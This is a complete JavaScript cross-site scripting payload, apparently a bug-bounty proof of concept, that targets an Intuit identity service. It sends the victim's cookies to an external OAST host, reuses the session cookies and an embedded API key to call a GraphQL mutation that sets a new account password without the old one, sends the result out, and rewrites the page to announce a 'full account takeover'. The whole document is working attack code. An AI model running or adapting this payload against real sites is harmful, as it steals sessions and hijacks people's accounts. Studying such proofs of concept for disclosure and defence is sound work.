(async function(){
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';

function gc(n){
var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
return m?decodeURIComponent(m[1]):''
}

function uid(){
return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){
var r=Math.random()*16|0;return(c==='x'?r:(r&0x3|0x8)).toString(16)
})
}

var sid=gc('ius_session');
var aid=gc('qbn.authid')||gc('0.authid');
var vid=gc('ivid');

(new Image).src=O+'/xss-cookies?c='+encodeURIComponent(document.cookie);

try{
var r=await fetch('/identity-api/v2/graphql',{
method:'POST',
credentials:'include',
headers:{
'Content-Type':'application/json',
'Authorization':'Intuit_APIKey intuit_apikey=prdakyresHrPbNYmoGmqMbZzZslfhGPRbBpwMfzE, intuit_apikey_version=1.0',
'intuit_sessionid':sid,
'intuit_profilingid':sid,
'intuit_routingid':aid,
'intuit_visitorid':vid,
'intuit_offeringid':'Intuit.cto.iam.ius',
'intuit_intentassetalias':'Intuit.cto.iam.ius',
'intuit_flowid':uid(),
'intuit_tid':uid()
},
body:JSON.stringify({
query:'mutation ReplacePassword($input:Identity_CreateOrReplacePasswordCredentialInput!){identityCreateOrReplacePasswordCredential(input:$input){__typename ...on Identity_CreateOrReplacePasswordCredentialSuccess{status}...on Identity_CredentialUnauthorizedError{message}...on Identity_CredentialInvalidInputError{message}...on Identity_DigitalIdentityLockedOutError{message}}}',
variables:{input:{newPassword:'Poc@2027'}},
operationName:'ReplacePassword'
})
});

var d=await r.json();
(new Image).src=O+'/xss-pwd-changed?r='+encodeURIComponent(JSON.stringify(d));

document.body.innerHTML='<div style="font:16px monospace;background:#111;color:#0f0;padding:40px;min-height:100vh">'
+'<h1 style="color:red">XSS PoC — Full Account Takeover</h1><hr style="border-color:#333">'
+'<h2 style="color:orange">1. Cookies Exfiltrated</h2>'
+'<p>ius_session: '+sid+'</p>'
+'<p>authId: '+aid+'</p>'
+'<h2 style="color:orange">2. Password Changed</h2>'
+'<p>New password: <b style="color:red;font-size:20px">Poc@2027</b></p>'
+'<p>Response: '+JSON.stringify(d)+'</p>'
+'<hr style="border-color:#333">'
+'<p style="color:yellow">Full ATO: cookie theft + password change without current password via XSS.</p></div>'

}catch(e){
(new Image).src=O+'/xss-error?e='+encodeURIComponent(e.message);
document.body.innerHTML='<div style="font:16px monospace;background:#111;color:red;padding:40px">'
+'<h1>XSS PoC</h1><p>Cookies sent to OAST (check dashboard)</p><p>Password change error: '+e.message+'</p></div>'
}
})();
